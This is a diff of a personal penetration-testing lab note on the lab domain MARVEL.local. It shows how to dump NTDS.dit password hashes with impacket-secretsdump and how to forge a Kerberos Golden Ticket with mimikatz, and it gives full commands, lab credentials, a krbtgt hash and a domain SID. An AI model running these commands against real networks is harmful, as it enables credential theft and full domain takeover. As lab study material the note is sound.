@@ -14,7 +14,7 @@ In the event we manage to compromise Domain and there is still time in the engag
 ### What is NTDS.dit?  
 An extremely critical and highly sensitive database used to store AD data within Active Directory / Domain Controllers:
 * user information
-* gorup information
+* group information
 * security dscriptors
 * password hashes
 
@@ -22,9 +22,9 @@ Using a **known domain admin account** we could use secretsdump and its switch o
 
 example:
 
-    impacket-secretsdump / secretsdump 'impacket-secretsdump MARVEL.local/pparker:'Password1'@192.168.64.139 -just-dc-ntlm
+    impacket-secretsdump / secretsdump - impacket-secretsdump MARVEL.local/pparker:'Password1'@192.168.64.139 -just-dc-ntlm
 
-using our malicious domain admin account hawkeye against the DC, we succesfully dump the local SAM and more importantly NTDS.dit file. From the dump we also see 'kerberos keys' and also the krbtgt which could be later leveraged in a kerberos ticket attack.
+using our malicious domain admin account hawkeye against the DC, we succesfully dumped the local SAM and more importantly the NTDS.dit file. From the dump we also see 'kerberos keys' and also the krbtgt which could be later leveraged in a kerberos ticket attack.
 
     impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138
 
@@ -90,31 +90,32 @@ ignore PC passwords, they are typically not going to be cracked and have low val
 6. when in any account, we could enumerate files and even spawn new shells
 
 ---
-### Performing a Golden Ticket Attack with a Pass the Ticket attack
+
+### Performing a Golden Ticket Attack with a Pass the Ticket attack  
+
 1. On the DC we have obtained mimikatz.exe by GentleKiwi
-2. We now aim to obtain the krbtgt account, Kerboros - ticket granting ticket account
-3. This allows us to generate tickets if we have the hash of the krbtgt account
-4. With the hash of the krbtgt account we can use it to access service and resource or create a 'Golden Ticket' and use that for access.
+3. We now aim to obtain the krbtgt account, Kerboros - ticket granting ticket account
+4. This allows us to generate tickets if we have the hash of the krbtgt account
+5. With the hash of the krbtgt account we can use it to access service and resource or create a 'Golden Ticket' and use that for access.
 
-on the DC, run as admin on cmd.exe, run the following:
-
+**From the DC, run as admin on cmd.exe and the following:**  
     mimikatz.exe
     privilige::debug
     lsadump::lsa /inject /name:krbtgt
 
 ![image](https://github.com/user-attachments/assets/7baacf00-be56-46aa-ba61-88670fbc1574)
 
-**Here we have obtained the:**  
+**Here we have obtained the krbtgt details, and use these to 'Pass the Hash' to create a 'Golden Ticket Session':**  
 user: krbtgt  
 SID of Domain: S-1-5-21-277273238-679169888-2290246510  
 ntlm hash: 2617733570dcba888a76e40359f8a359  
 /id: 500 (admin account)  
 /ptt:  pass the ticket  
 
-**now we generate a Golden Ticket with the above details:**  
+**Generate a Golden Ticket and session with these details:**  
 
     mimikatz # kerberos::golden /User:FakeUser123 /domain:marvel.local /sid:S-1-5-21-277273238-679169888-2290246510 /krbtgt:2617733570dcba888a76e40359f8a359 /id:500 /ptt
 
 ![image](https://github.com/user-attachments/assets/668c803d-d4dc-4e3d-985f-a97a78ac3667)
 
-
+**From this we have no obtained a Golden Ticket for our fakeuser in current session**
